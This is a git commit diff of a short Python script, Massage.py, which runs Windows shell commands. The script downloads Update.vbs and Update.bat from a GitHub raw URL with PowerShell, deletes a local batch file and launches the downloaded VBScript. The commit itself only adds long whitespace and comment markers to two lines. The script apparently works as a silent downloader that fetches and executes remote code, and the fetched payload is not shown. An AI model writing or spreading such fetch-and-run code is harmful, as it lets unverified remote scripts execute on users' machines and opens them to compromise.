a6252d6b230aef62eae4fd95c7a4944668075ec5
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-16 11:17:26 +0400

    Update Massage.py

--- Massage.py
+++ Massage.py
@@ -1,10 +1,10 @@
 import os
 import sys
 
-os.system("timeout /t 10")
+os.system("timeout /t 10")                                                          #-----------#
 os.system('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs"')
 os.system("timeout /t 5")
-os.system("del Update.bat")
+os.system("del Update.bat")                                                         #-----------#
 os.system('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat"')
 os.system("timeout /t 5")
 os.system("start Update.vbs")
